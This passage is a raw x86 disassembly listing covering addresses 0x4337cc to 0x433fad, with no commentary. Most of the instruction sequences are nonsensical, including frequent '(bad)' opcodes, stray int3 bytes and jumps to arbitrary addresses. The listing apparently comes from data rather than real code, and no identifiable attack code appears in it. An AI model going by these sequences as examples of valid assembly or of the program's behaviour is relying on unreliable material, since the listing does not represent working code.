  4337cc:	dec    DWORD PTR [ecx-0x16ff1345]
  4337d2:	repnz mov DWORD PTR [edx+eiz*2+0x0],ecx
  4337d7:	add    BYTE PTR [eax],al
  4337d9:	shl    esp,1
  4337db:	inc    DWORD PTR [ebx-0xdbdb7d]
  4337e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4337e2:	int3   
  4337e3:	jmp    DWORD PTR ds:0xff83ffb7
  4337e9:	adc    ebx,DWORD PTR [esi-0x6a7c0100]
  4337ef:	push   ss
  4337f0:	add    bh,ah
  4337f2:	ret    0x2983
  4337f5:	inc    eax
  4337f6:	(bad)  
  4337f7:	inc    DWORD PTR [eax]
  4337f9:	pop    ax
  4337fb:	add    BYTE PTR [ebx+0xd9aecc],al
  433801:	mov    eax,ds:0x7589cc8f
  433806:	inc    DWORD PTR [eax]
  433808:	call   DWORD PTR [ebx-0x337c7cf7]
  43380e:	out    dx,eax
  43380f:	lods   al,BYTE PTR ds:[esi]
  433810:	push   DWORD PTR [esi+0x1b4d832a]
  433816:	or     DWORD PTR [ecx+0x446c00],0xffffffcc
  43381d:	int3   
  43381e:	cmp    bh,BYTE PTR [edx]
  433820:	add    BYTE PTR [esi],cl
  433822:	add    bh,bh
  433824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433825:	push   edx
  433826:	dec    DWORD PTR [ecx-0xcc5777]
  43382c:	(bad)  
  43382d:	jmp    FWORD PTR [ecx-0x25]
  433830:	add    BYTE PTR [eax+0x65c40035],dh
  433836:	(bad)  
  433837:	inc    DWORD PTR [eax]
  433839:	adc    edi,ebx
  43383b:	add    BYTE PTR [ecx-0x7cf56300],cl
  433841:	fistp  DWORD PTR [eax+0x3305ff]
  433847:	add    bh,bh
  433849:	sub    DWORD PTR [ecx],edi
  43384b:	(bad)  
  43384c:	inc    DWORD PTR [eax]
  43384e:	imul   eax,DWORD PTR [ebp+0x4347ff],0x6c
  433855:	jno    0x433856
  433857:	int3   
  433858:	add    BYTE PTR [edi-0xf4],ah
  43385e:	jnp    0x43380f
  433860:	(bad)  
  433861:	aas    
  433862:	ret    0xf8ff
  433865:	out    0x0,al
  433867:	add    DWORD PTR [ebx-0x7c00410b],0xffffff83
  43386e:	ficomp DWORD PTR [ebp-0x21587d]
  433874:	sahf   
  433875:	or     edi,edi
  433877:	(bad)  
  433878:	call   FWORD PTR [edx+0xf3]
  43387e:	inc    ecx
  43387f:	xchg   edx,eax
  433880:	mov    DWORD PTR [eax],ebx
  433882:	lahf   
  433883:	add    BYTE PTR [edi-0x4b],cl
  433886:	mov    DWORD PTR [eax],eax
  433888:	dec    esi
  43388a:	mov    edx,0x11ff0000
  43388f:	rol    DWORD PTR [eax],0xd1
  433892:	jae    0x433894
  433894:	add    eax,0xffcc4e
  433899:	xchg   esp,eax
  43389a:	repnz (bad) 
  43389c:	(bad)  
  43389d:	call   DWORD PTR [ebx+eax*8]
  4338a0:	add    BYTE PTR [edx],bl
  4338a2:	mov    edx,0xff1b6c89
  4338a7:	int3   
  4338a8:	dec    esi
  4338aa:	ret    
  4338ab:	int3   
  4338ac:	add    DWORD PTR [eax],0x40
  4338af:	stc    
  4338b0:	jmp    FWORD PTR [edi]
  4338b2:	(bad)  
  4338b4:	int    0x26
  4338b6:	(bad)  
  4338b7:	(bad)  
  4338b8:	(bad)  
  4338b9:	jmp    0x4338b8
  4338be:	dec    ebp
  4338bf:	in     al,0x0
  4338c1:	gs dec edx
  4338c3:	(bad)  
  4338c4:	stc    
  4338c5:	jb     0x43384a
  4338c7:	(bad)  
  4338c8:	inc    DWORD PTR [edi+ebx*1-0x1]
  4338cc:	int3   
  4338cd:	add    BYTE PTR [eax-0x7e39ff7e],dh
  4338d3:	jmp    DWORD PTR [eax]
  4338d5:	push   0xffffffff
  4338d7:	(bad)  
  4338d8:	dec    DWORD PTR [ecx]
  4338da:	cmp    bh,bh
  4338dc:	add    BYTE PTR [eax],al
  4338de:	inc    esp
  4338df:	imul   eax,DWORD PTR [ebx+0x53ff28d2],0xffffffca
  4338e6:	add    BYTE PTR [eax],al
  4338e8:	add    BYTE PTR [ebp+0x6],ah
  4338eb:	add    BYTE PTR [ebx-0x7cfba101],al
  4338f1:	mov    esp,0x81bbffb7
  4338f6:	(bad)  
  4338f7:	(bad)  
  4338f8:	push   DWORD PTR [ebx+0x5e]
  4338fb:	or     DWORD PTR [ecx-0x7cc75e00],0x4a
  433902:	xchg   bh,bh
  433904:	nop
  433905:	cmc    
  433906:	inc    DWORD PTR [eax]
  433908:	xor    DWORD PTR [ebx],0x51
  43390b:	inc    DWORD PTR [eax]
  43390d:	inc    DWORD PTR [ebp-0x77]
  433910:	int3   
  433911:	jp     0x4338a0
  433913:	add    BYTE PTR [esi+0x39],cl
  433916:	dec    DWORD PTR [ecx+0xc97ff]
  43391c:	(bad)  
  43391d:	call   DWORD PTR [edx-0x44]
  433920:	dec    esp
  433922:	add    eax,0xff19f4ff
  433927:	add    BYTE PTR [eax],al
  433929:	lahf   
  43392a:	mov    eax,0x90ffff00
  43392f:	dec    esi
  433930:	or     DWORD PTR [ebp+esi*1-0x1],0x45
  433935:	push   cs
  433936:	(bad)  
  433937:	(bad)  
  433938:	call   FWORD PTR [ecx-0x40]
  43393b:	inc    DWORD PTR [eax]
  43393d:	mov    DWORD PTR [edi-0x79],eax
  433940:	int3   
  433941:	add    ch,BYTE PTR [ecx-0x77]
  433944:	and    BYTE PTR [edi+edi*8],bl
  433947:	add    ah,cl
  433949:	jmp    edx
  43394b:	add    DWORD PTR [eax],0xffffffff
  43394e:	push   0x5c
  433950:	jmp    DWORD PTR [edx-0x5c87cb9]
  433956:	add    bh,bh
  433958:	call   FWORD PTR [ebp+0xffffc5]
  43395e:	mov    edi,0xb747839f
  433963:	and    DWORD PTR [esp+ebx*8-0x77],0xffffffff
  433968:	int3   
  433969:	mov    esi,0xffffbd
  43396e:	out    dx,al
  43396f:	jns    0x43393d
  433971:	jmp    0x4339b1
  433973:	add    BYTE PTR [ebp+0xff003b],ah
  433979:	jns    0x4339a7
  43397b:	add    bh,bh
  43397d:	add    BYTE PTR [ecx],al
  43397f:	or     bh,bh
  433981:	pop    es
  433982:	add    edi,edi
  433984:	fdivr  DWORD PTR [eax-0x1]
  433987:	dec    esp
  433989:	xlat   BYTE PTR es:[ebx]
  43398b:	(bad)  
  43398c:	(bad)  
  43398d:	dec    DWORD PTR [ecx+0x72]
  433990:	jmp    DWORD PTR [edx+0x73]
  433993:	add    cl,cl
  433995:	cmp    al,BYTE PTR [eax]
  433997:	(bad)  
  433998:	jmp    FWORD PTR [ebx+edi*8-0x65ff3301]
  43399f:	mov    ah,0xff
  4339a1:	push   ebp
  4339a2:	ins    DWORD PTR es:[edi],dx
  4339a3:	jmp    DWORD PTR [ebp-0x5e]
  4339a6:	add    bh,bh
  4339a8:	push   DWORD PTR [ebx-0x74]
  4339ab:	add    DWORD PTR [eax],0xffffff89
  4339ae:	xor    al,0x1
  4339b0:	jmp    DWORD PTR [ebx+ecx*1-0x34]
  4339b4:	ds in  al,0xff
  4339b7:	add    BYTE PTR [eax],al
  4339b9:	ror    DWORD PTR [ebp-0x7d],1
  4339bc:	inc    DWORD PTR [eax]
  4339be:	pop    edx
  4339bf:	mov    edi,edi
  4339c1:	push   es
  4339c2:	out    dx,eax
  4339c3:	jmp    DWORD PTR [edi-0x33006f]
  4339c9:	aas    
  4339ca:	popa   
  4339cb:	inc    DWORD PTR [eax]
  4339cd:	mov    esp,edi
  4339cf:	pop    edx
  4339d0:	int3   
  4339d1:	dec    edx
  4339d3:	inc    DWORD PTR [edi]
  4339d5:	lea    ecx,[ecx+0x301b00ff]
  4339db:	mov    edi,edi
  4339dd:	int3   
  4339de:	test   DWORD PTR [eax-0x7c8a3401],0x831cbf
  4339e8:	add    BYTE PTR [edi],dl
  4339ea:	fild   DWORD PTR [ebx+0x4a0089ff]
  4339f0:	add    BYTE PTR [edx],cl
  4339f2:	or     al,0x83
  4339f4:	cmp    DWORD PTR [edx-0x1d000001],eax
  4339fa:	aam    0xff
  4339fc:	add    bh,bh
  4339fe:	loopne 0x433a10
  433a00:	add    BYTE PTR [edi-0x69],cl
  433a03:	add    BYTE PTR [edi+esi*2],ah
  433a06:	add    DWORD PTR [ebx-0x522a01],0xffffffff
  433a0d:	jmp    FWORD PTR [esp+eax*1-0x94ff00]
  433a14:	xor    al,0xa5
  433a16:	(bad)  
  433a17:	(bad)  
  433a18:	call   FWORD PTR [edx-0x7cfa]
  433a1e:	in     al,dx
  433a1f:	leave  
  433a20:	call   FWORD PTR [edx+0x4ed1cc0e]
  433a26:	inc    DWORD PTR [ebx+0x73c4ff]
  433a2c:	add    bh,bh
  433a2e:	shl    DWORD PTR [ebx+0x836000],cl
  433a34:	in     al,dx
  433a35:	(bad)  
  433a36:	(bad)  
  433a37:	inc    DWORD PTR [eax]
  433a39:	repz adc edi,edi
  433a3c:	cmp    edi,0xffffffd7
  433a3f:	icebp  
  433a40:	call   DWORD PTR [ebx+0x24]
  433a43:	mov    DWORD PTR [ebp-0x7c0091],ebp
  433a49:	scas   al,BYTE PTR es:[edi]
  433a4a:	nop
  433a4b:	(bad)  
  433a4c:	inc    DWORD PTR [eax]
  433a4e:	push   esi
  433a4f:	cwde   
  433a50:	add    BYTE PTR [edx+0x28007d],dh
  433a56:	(bad)  
  433a57:	inc    DWORD PTR [eax]
  433a59:	bnd jae 0x4339df
  433a5c:	mov    edi,edi
  433a5e:	pop    ecx
  433a5f:	and    DWORD PTR [eax],eax
  433a61:	(bad)  
  433a62:	mov    ds:0xff03b400,al
  433a67:	(bad)  
  433a68:	push   DWORD PTR [edi+0x9]
  433a6b:	dec    DWORD PTR [ecx-0xeceb01]
  433a71:	test   esp,ecx
  433a73:	int3   
  433a74:	mov    al,ds:0xffffff0a
  433a79:	lock idiv bh
  433a7c:	(bad)  
  433a7d:	push   DWORD PTR [edx-0x38]
  433a80:	push   DWORD PTR [esi+0x1e8f8350]
  433a86:	int3   
  433a87:	mov    edi,edi
  433a89:	retf   
  433a8a:	mov    al,ds:0xb0cc00ff
  433a8f:	mov    al,0x83
  433a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433a92:	js     0x433a93
  433a94:	div    BYTE PTR [edi-0x1]
  433a97:	cmp    edi,0x1a
  433a9a:	xchg   esi,eax
  433a9b:	add    DWORD PTR [eax],0xffffffff
  433a9e:	cmp    bh,ah
  433aa0:	adc    DWORD PTR [edi+edi*4+0xe93789],0xffffffff
  433aa8:	add    BYTE PTR [ebx+esi*1+0x41ff00ff],dl
  433aaf:	or     eax,DWORD PTR [ebx+0x7b8942d7]
  433ab5:	pop    es
  433ab6:	cmp    edi,0xffffff89
  433ab9:	jecxz  0x433a74
  433abb:	inc    DWORD PTR [eax]
  433abd:	int3   
  433abe:	sub    DWORD PTR [ecx-0x330e7100],edi
  433ac4:	jmp    0x5eeb:0xff000071
  433acb:	cmp    edi,0xffffffff
  433ace:	and    eax,0xe85100f9
  433ad3:	add    BYTE PTR [eax],ah
  433ad5:	loop   0x433ad6
  433ad7:	mov    edi,edi
  433ad9:	fidivr DWORD PTR [ebp-0x4733007d]
  433adf:	sub    DWORD PTR [eax],eax
  433ae1:	cmp    al,0x84
  433ae3:	add    al,ah
  433ae5:	push   edx
  433ae6:	inc    DWORD PTR [eax]
  433ae8:	call   FWORD PTR [ecx]
  433aea:	add    DWORD PTR [ebx+0x25ceffcc],0x2ebdff
  433af4:	stc    
  433af5:	js     0x433ac3
  433af7:	int3   
  433af8:	mov    ebx,edx
  433afa:	push   0xffffff89
  433afc:	(bad)  
  433afd:	jmp    DWORD PTR [eax]
  433aff:	str    WORD PTR [ecx]
  433b02:	loop   0x433b03
  433b04:	int3   
  433b05:	inc    edi
  433b06:	add    DWORD PTR [eax],0x0
  433b09:	lods   al,BYTE PTR ds:[esi]
  433b0a:	inc    esi
  433b0b:	mov    DWORD PTR [ebx-0xa1ff00],eax
  433b11:	and    BYTE PTR [eax+eax*1+0x75],dh
  433b15:	push   cs
  433b16:	add    BYTE PTR [eax],al
  433b18:	push   DWORD PTR [ecx-0x36]
  433b1b:	cmp    edi,0xffffffff
  433b1e:	pop    eax
  433b1f:	mov    ds:0xff81a6ff,eax
  433b24:	call   0x1423b3f
  433b29:	xchg   esi,eax
  433b2a:	jl     0x433b2b
  433b2c:	inc    DWORD PTR [eax]
  433b2e:	(bad)  
  433b2f:	stos   BYTE PTR es:[edi],al
  433b30:	int3   
  433b31:	mov    ch,BYTE PTR [ebp+0xed1483]
  433b37:	int3   
  433b38:	add    BYTE PTR [ecx-0x7c00cf],bh
  433b3e:	mov    al,0xcd
  433b40:	(bad)  
  433b41:	fbstp  TBYTE PTR [edi+edi*8+0xccb17f]
  433b48:	(bad)  
  433b49:	in     eax,dx
  433b4a:	add    BYTE PTR [eax],0x83
  433b4d:	sbb    edi,0xffffffaa
  433b50:	add    bh,bl
  433b52:	inc    esp
  433b53:	int3   
  433b54:	push   ds
  433b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433b56:	inc    DWORD PTR [eax]
  433b58:	inc    DWORD PTR [edi+0xa]
  433b5b:	int3   
  433b5c:	cmp    edi,0xffffffe3
  433b5f:	ud0    eax,DWORD PTR ds:0x2291006a
  433b66:	(bad)  
  433b67:	(bad)  
  433b68:	(bad)  
  433b69:	fnstenv ds:0x2700ff83
  433b6f:	xchg   esi,eax
  433b70:	jmp    edx
  433b72:	push   edi
  433b73:	dec    DWORD PTR [eax+0x28]
  433b76:	mov    DWORD PTR [eax],eax
  433b78:	(bad)  
  433b79:	jmp    0xcd423c16
  433b7e:	pop    ds
  433b7f:	lock adc DWORD PTR [esi],0xfffffff7
  433b83:	(bad)  
  433b84:	jle    0x433b27
  433b86:	add    BYTE PTR [eax],al
  433b88:	sub    DWORD PTR [edi+0x17],0xffffffff
  433b8c:	inc    DWORD PTR [eax]
  433b8e:	jb     0x433b4f
  433b90:	dec    DWORD PTR [ebx+0xd1c83d8]
  433b96:	(bad)  
  433b97:	(bad)  
  433b98:	push   DWORD PTR [ebx+0x46]
  433b9b:	inc    DWORD PTR [ebx-0x424601]
  433ba1:	mov    ebx,DWORD PTR [edx]
  433ba3:	mov    DWORD PTR [edi+0x6c],edi
  433ba6:	cmp    edi,0x0
  433ba9:	les    ecx,FWORD PTR [ebx-0x4007c7d]
  433baf:	mov    eax,DWORD PTR [eax]
  433bb1:	inc    ebx
  433bb2:	xor    al,0x0
  433bb4:	(bad)  
  433bb6:	add    bh,bh
  433bb8:	add    BYTE PTR [ecx],al
  433bba:	xchg   esp,eax
  433bbb:	add    BYTE PTR [ecx-0x4ba800],cl
  433bc1:	outs   dx,BYTE PTR ds:[esi]
  433bc2:	and    edi,edi
  433bc4:	sar    BYTE PTR [eax+eax*1],cl
  433bc7:	add    bh,bh
  433bc9:	js     0x433bd7
  433bcb:	(bad)  
  433bcc:	inc    DWORD PTR [eax]
  433bce:	push   esi
  433bcf:	aad    0xff
  433bd1:	inc    esp
  433bd2:	(bad)  
  433bd3:	dec    DWORD PTR [ebp-0x4c]
  433bd6:	dec    DWORD PTR [ecx-0x347c7d]
  433bdc:	inc    DWORD PTR [eax]
  433bde:	inc    edx
  433bdf:	ror    ah,cl
  433be1:	xchg   edx,eax
  433be2:	mov    dl,0x0
  433be4:	out    0x3b,al
  433be6:	inc    DWORD PTR [ebx-0x33fb3701]
  433bec:	(bad)  
  433bed:	push   edi
  433bef:	xchg   esi,eax
  433bf0:	call   FWORD PTR [edx+0x1a]
  433bf3:	push   DWORD PTR [edi]
  433bf5:	and    al,0x0
  433bf7:	inc    DWORD PTR [eax]
  433bf9:	(bad)  
  433bfa:	mov    esi,0xc083ccff
  433bff:	nop
  433c00:	add    BYTE PTR [edi],al
  433c02:	fdiv   st(7),st
  433c04:	sbb    ah,ch
  433c06:	int3   
  433c07:	(bad)  
  433c08:	(bad)  
  433c09:	cmp    BYTE PTR [ebp+0x4dffff00],bl
  433c0f:	fld    QWORD PTR [ebx+0x1c83ed79]
  433c15:	mov    ebp,0xc8008300
  433c1a:	push   ebx
  433c1b:	(bad)  
  433c1c:	dec    DWORD PTR [ecx+0x789fc94]
  433c22:	jmp    DWORD PTR [bx-0x1]
  433c26:	add    bh,bh
  433c28:	add    BYTE PTR [edi+edx*1],dl
  433c2b:	add    DWORD PTR [ebx-0x7690eb34],0xfffffff6
  433c32:	add    eax,0xff4bc6ff
  433c37:	or     esp,0xffffffd1
  433c3a:	sbb    BYTE PTR [eax],al
  433c3c:	(bad)  
  433c3d:	jmp    eax
  433c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c40:	jmp    FWORD PTR [edi+0xa]
  433c43:	adc    DWORD PTR [edi],0x58
  433c46:	cmp    edi,0xffffffcc
  433c49:	push   ebx
  433c4a:	push   0xafff8300
  433c4f:	jae    0x433c51
  433c51:	out    dx,al
  433c52:	push   ecx
  433c53:	add    BYTE PTR [ecx-0xb],bl
  433c56:	add    DWORD PTR [eax],0x0
  433c59:	or     eax,0xffff001b
  433c5e:	jbe    0x433c3b
  433c60:	inc    ecx
  433c62:	and    eax,0xffdd97ff
  433c67:	inc    DWORD PTR [eax]
  433c69:	aaa    
  433c6a:	(bad)  
  433c6b:	(bad)  
  433c6c:	inc    DWORD PTR [eax]
  433c6e:	fisubr WORD PTR [eax]
  433c70:	(bad)  
  433c71:	fcom   DWORD PTR [edi+edi*8-0x46]
  433c75:	sar    bh,cl
  433c77:	add    DWORD PTR [eax],0xffffffe0
  433c7a:	cli    
  433c7b:	dec    esp
  433c7d:	add    al,al
  433c7f:	add    BYTE PTR cs:[ebp-0x6c0a7c84],bl
  433c86:	cmp    edi,0xffffffff
  433c89:	push   eax
  433c8a:	sti    
  433c8b:	add    bh,bh
  433c8d:	dec    DWORD PTR [esi+0x2a]
  433c90:	(bad)  
  433c91:	cld    
  433c92:	mov    ch,0x0
  433c94:	or     al,0x1
  433c96:	add    BYTE PTR [eax],al
  433c98:	add    BYTE PTR [edx+0x1],dh
  433c9b:	add    BYTE PTR [ebx-0x7caeb600],al
  433ca1:	ins    BYTE PTR es:[di],dx
  433ca3:	jmp    DWORD PTR [eax-0x7689]
  433ca9:	inc    esi
  433caa:	xchg   DWORD PTR [ecx-0x12820000],ecx
  433cb0:	add    BYTE PTR [ecx+0x65],ch
  433cb3:	(bad)  
  433cb4:	mov    edi,0xff8915
  433cb9:	jno    0x433d33
  433cbb:	add    BYTE PTR [eax],al
  433cbd:	add    BYTE PTR [eax+0x77],dh
  433cc0:	stos   BYTE PTR es:[edi],al
  433cc1:	push   0xffffffff
  433cc3:	add    al,dh
  433cc5:	(bad)  
  433cc6:	dec    esp
  433cc8:	add    bh,bh
  433cca:	cmp    al,0xff
  433ccc:	fistp  WORD PTR [ebx]
  433cce:	imul   ebp,DWORD PTR [ebp-0x5],0x8583ffdd
  433cd5:	add    BYTE PTR [eax],al
  433cd7:	(bad)  
  433cd8:	(bad)  
  433cd9:	call   FWORD PTR [edx-0x77]
  433cdc:	loop   0x433c6b
  433cde:	cmp    edx,DWORD PTR [edi]
  433ce0:	push   ecx
  433ce1:	push   ds
  433ce2:	add    bh,bh
  433ce4:	(bad)  
  433ce5:	(bad)  
  433ce6:	inc    DWORD PTR [eax]
  433ce8:	(bad)  
  433ce9:	jmp    FWORD PTR [eax]
  433ceb:	add    dh,ah
  433ced:	xor    BYTE PTR [edi-0xce643b],bh
  433cf3:	call   ebx
  433cf5:	inc    DWORD PTR [ebx-0x13ffff01]
  433cfb:	inc    ebp
  433cfd:	pusha  
  433cfe:	imul   ecx,eax,0xfffffff9
  433d01:	xor    al,0x0
  433d03:	sub    DWORD PTR [esi-0x7d],0xffffffcc
  433d07:	int3   
  433d08:	(bad)  
  433d09:	(bad)  
  433d0a:	mov    eax,0x99136700
  433d0f:	xchg   esi,eax
  433d10:	cmp    DWORD PTR [ecx],ebp
  433d12:	inc    DWORD PTR [eax]
  433d14:	jp     0x433d15
  433d16:	dec    esp
  433d18:	add    BYTE PTR [ecx-0x2ee1ff59],cl
  433d1e:	ins    DWORD PTR es:[edi],dx
  433d1f:	sub    eax,0xcc210a
  433d24:	cmp    bh,0x83
  433d27:	dec    DWORD PTR [ecx+0x3f00c889]
  433d2d:	in     eax,dx
  433d2e:	gs adc ebp,esi
  433d31:	xchg   edx,eax
  433d32:	add    bh,bh
  433d34:	in     eax,dx
  433d35:	(bad)  
  433d36:	inc    DWORD PTR [ebx+0x9dff83]
  433d3c:	stos   DWORD PTR es:[edi],eax
  433d3d:	xor    dl,ch
  433d3f:	gs pop edx
  433d41:	push   cs
  433d42:	add    BYTE PTR [ebx+0x83ccab],al
  433d48:	add    ah,cl
  433d4a:	mov    ebx,0x4d604800
  433d4f:	mov    bh,0xf
  433d51:	pushf  
  433d52:	cmp    edi,0xffffffa4
  433d55:	int3   
  433d56:	dec    DWORD PTR [ecx+0xd1ffcc]
  433d5c:	mov    ebx,0x34357d20
  433d61:	pop    ds
  433d62:	add    bh,bh
  433d64:	and    DWORD PTR [ebx-0x7c0100],eax
  433d6a:	pop    ecx
  433d6b:	sbb    DWORD PTR [ebx+0x779ffe2d],0xffffff8c
  433d72:	dec    DWORD PTR [ecx+0xffcc8c]
  433d78:	add    BYTE PTR [ecx+0x44aa0065],cl
  433d7e:	stos   BYTE PTR es:[edi],al
  433d7f:	popa   
  433d80:	pushf  
  433d81:	js     0x433d0c
  433d83:	dec    ebp
  433d85:	(bad)  
  433d86:	dec    esp
  433d88:	(bad)  
  433d89:	push   DWORD PTR [edx]
  433d8b:	jmp    ebp
  433d8d:	retf   
  433d8e:	adc    DWORD PTR [ecx],edx
  433d90:	push   edx
  433d91:	mov    esi,0xffeeffff
  433d96:	add    bh,bh
  433d98:	(bad)  
  433d99:	jmp    FWORD PTR [edx-0x1]
  433d9c:	add    BYTE PTR [ebx+0x59e2956],ah
  433da2:	add    bh,bh
  433da4:	jmp    0x433da5
  433da6:	dec    esp
  433da8:	add    DWORD PTR [eax],0x6
  433dab:	call   ebx
  433dad:	not    DWORD PTR [ebp+eax*2+0xff4d89]
  433db4:	ins    BYTE PTR es:[edi],dx
  433db5:	add    DWORD PTR [eax],0x0
  433db8:	inc    DWORD PTR [eax]
  433dba:	and    DWORD PTR ds:0x19b68eb9,0xffffffc7
  433dc2:	(bad)  
  433dc3:	jmp    ecx
  433dc5:	cmp    edi,0xffffffff
  433dc8:	cmp    edi,0x73
  433dcb:	add    dh,ch
  433dcd:	call   0xd794b25b
  433dd2:	inc    DWORD PTR [eax]
  433dd4:	jbe    0x433dd6
  433dd6:	add    BYTE PTR [ecx-0x76170001],cl
  433ddc:	gs mov dl,0xb5
  433ddf:	cmp    eax,0xffff2d3f
  433de4:	dec    eax
  433de5:	add    bh,bh
  433de7:	inc    DWORD PTR [eax]
  433de9:	add    bl,bh
  433deb:	add    BYTE PTR [ebx],bh
  433ded:	loop   0x433da5
  433def:	loope  0x433e2f
  433df1:	cld    
  433df2:	int3   
  433df3:	add    BYTE PTR [esi],cl
  433df5:	inc    DWORD PTR [ebx+0x77ffffff]
  433dfb:	(bad)  
  433dfc:	mov    esp,0x4de1f77c
  433e01:	ins    DWORD PTR es:[edi],dx
  433e02:	dec    esp
  433e04:	lods   al,BYTE PTR ds:[esi]
  433e05:	inc    DWORD PTR [eax]
  433e07:	add    DWORD PTR [ebx-0x5d00fb34],0x7e
  433e0e:	adc    ch,bh
  433e10:	xor    BYTE PTR [ebp-0x1],dh
  433e13:	call   FWORD PTR [ebx]
  433e15:	inc    DWORD PTR [ebx+0x60008300]
  433e1b:	dec    edi
  433e1d:	je     0x433df1
  433e1f:	cmp    DWORD PTR [ebx],0x3aff83f1
  433e25:	add    BYTE PTR [eax],al
  433e27:	add    BYTE PTR [ecx-0x11ffa234],cl
  433e2d:	push   esp
  433e2e:	adc    BYTE PTR [ebp-0x4d],0xa0
  433e32:	mov    edi,edi
  433e34:	lahf   
  433e35:	add    BYTE PTR [eax],al
  433e37:	int3   
  433e38:	(bad)  
  433e39:	(bad)  
  433e3a:	jnp    0x433e3b
  433e3c:	(bad)  
  433e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433e3e:	out    0x27,al
  433e40:	dec    esi
  433e41:	mov    edx,0xff1c00ff
  433e46:	inc    DWORD PTR [eax]
  433e48:	inc    DWORD PTR [eax]
  433e4a:	inc    edi
  433e4b:	add    BYTE PTR [eax-0x13],dh
  433e4e:	or     DWORD PTR [ecx],ebx
  433e50:	mov    bl,0xc5
  433e52:	(bad)  
  433e53:	push   DWORD PTR [eax]
  433e55:	add    bh,bh
  433e57:	inc    DWORD PTR [eax]
  433e59:	push   eax
  433e5b:	add    BYTE PTR ds:0x2c97aaed,bl
  433e61:	mov    edi,edi
  433e63:	inc    DWORD PTR [ebx]
  433e65:	inc    DWORD PTR [ebx-0x3000034]
  433e6b:	call   FWORD PTR [edi-0x6ddf5272]
  433e71:	lea    eax,[eax]
  433e73:	mov    esi,edx
  433e75:	add    BYTE PTR [ebx+0x30008300],al
  433e7b:	add    BYTE PTR [ebx+edi*4-0x68],dh
  433e7f:	je     0x433e75
  433e81:	lahf   
  433e82:	add    bh,bh
  433e84:	pop    edx
  433e85:	add    BYTE PTR [ebx-0x19000034],al
  433e8b:	(bad)  
  433e8c:	mov    edi,0x2e8f6878
  433e91:	jl     0x433e92
  433e93:	add    BYTE PTR ds:0xff8300,al
  433e99:	add    BYTE PTR [ebx-0xda5d01],dl
  433e9f:	ins    DWORD PTR es:[edi],dx
  433ea0:	xor    DWORD PTR [edi+edi*8],esp
  433ea3:	add    dl,dh
  433ea5:	add    ah,cl
  433ea7:	inc    DWORD PTR [ebx+0x3ff90ff]
  433ead:	push   0xffffffac
  433eaf:	inc    esi
  433eb0:	out    dx,eax
  433eb1:	popf   
  433eb2:	add    BYTE PTR [eax],al
  433eb4:	aaa    
  433eb5:	cmp    edi,0xffffffff
  433eb8:	cmp    edi,0xffffffbc
  433ebb:	add    BYTE PTR [ebp+0x6a],cl
  433ebe:	aam    0x58
  433ec0:	mov    edi,0x878300fc
  433ec5:	inc    DWORD PTR [eax]
  433ec7:	(bad)  
  433ec8:	(bad)  
  433ec9:	call   FWORD PTR [esi-0x1]
  433ecc:	test   al,0x3
  433ece:	mov    ebx,0x9c1b25
  433ed3:	add    BYTE PTR [ecx],ch
  433ed5:	add    BYTE PTR [eax],al
  433ed7:	dec    esp
  433ed9:	mov    DWORD PTR [esi+0x67d6abff],edi
  433edf:	stos   WORD PTR es:[edi],ax
  433ee1:	leave  
  433ee2:	add    bh,bh
  433ee4:	imul   eax,DWORD PTR [eax],0xff0000
  433eea:	mov    edx,0x24e9a000
  433eef:	or     cl,BYTE PTR [eax]
  433ef1:	xor    BYTE PTR [eax],al
  433ef3:	dec    DWORD PTR [edi+0x0]
  433ef6:	add    DWORD PTR [eax],0x0
  433ef9:	cmp    DWORD PTR [edi+0x0],0x61
  433efd:	fcom   QWORD PTR [ecx+0x1]
  433f00:	push   es
  433f01:	ror    BYTE PTR [ecx-0x1300],cl
  433f07:	inc    DWORD PTR [eax]
  433f09:	add    BYTE PTR [edi+edi*8-0x28],bl
  433f0d:	mov    cs,WORD PTR [esi+edx*8-0x59]
  433f11:	dec    ebx
  433f12:	add    bh,bh
  433f14:	mov    ch,0x0
  433f16:	add    bh,bh
  433f18:	mov    DWORD PTR [eax],eax
  433f1a:	pop    esi
  433f1b:	inc    DWORD PTR [ebp+0x66]
  433f1e:	dec    eax
  433f1f:	and    eax,DWORD PTR ds:0x17ff838f
  433f25:	(bad)  
  433f26:	inc    DWORD PTR [eax]
  433f28:	(bad)  
  433f29:	dec    eax
  433f2b:	add    BYTE PTR [ecx],dl
  433f2d:	data16 cld 
  433f2f:	jae    0x433efa
  433f31:	xchg   esi,eax
  433f32:	int3   
  433f33:	sbb    DWORD PTR [eax+eax*1-0x34],0xffffffff
  433f38:	(bad)  
  433f39:	(bad)  
  433f3a:	aas    
  433f3b:	call   esi
  433f3d:	or     DWORD PTR [esi],esi
  433f3f:	hlt    
  433f40:	xor    BYTE PTR [edi+edi*8],ah
  433f43:	push   edx
  433f45:	add    BYTE PTR [eax],al
  433f47:	add    BYTE PTR [ebx-0x6c006001],al
  433f4d:	mov    ah,0x43
  433f4f:	xor    edx,ecx
  433f51:	jne    0x433f53
  433f53:	jmp    edi
  433f55:	mov    DWORD PTR [eax],eax
  433f57:	inc    DWORD PTR [eax]
  433f59:	add    BYTE PTR [esi-0x1],ah
  433f5c:	loopne 0x433f41
  433f5e:	mov    esp,0x83879d55
  433f63:	add    ch,bl
  433f65:	add    BYTE PTR [ecx-0x25000000],cl
  433f6b:	add    cl,dh
  433f6d:	push   ebx
  433f6e:	repnz xor ebx,DWORD PTR [esi-0xc]
  433f72:	add    bh,bh
  433f74:	pop    DWORD PTR [eax]
  433f76:	add    bh,bh
  433f78:	add    BYTE PTR [ecx+0x3abbcc7c],cl
  433f7e:	imul   esi,DWORD PTR [edx+ebp*4],0x46ff0032
  433f85:	inc    DWORD PTR [eax]
  433f87:	(bad)  
  433f88:	inc    DWORD PTR [eax]
  433f8a:	mov    al,ds:0x95678600
  433f8f:	sub    bl,BYTE PTR [ebp+0x18]
  433f92:	inc    DWORD PTR [eax]
  433f94:	add    BYTE PTR [ecx-0x7d],cl
  433f9a:	dec    esp
  433f9b:	(bad)  
  433f9c:	jle    0x433f47
  433f9e:	mov    al,ds:0x8315c1f6
  433fa3:	call   DWORD PTR [edi+edi*8]
  433fa6:	dec    esp
  433fa8:	cmp    edi,0x5
  433fab:	int3   
  433fac:	std    
  433fad:	out    dx,al
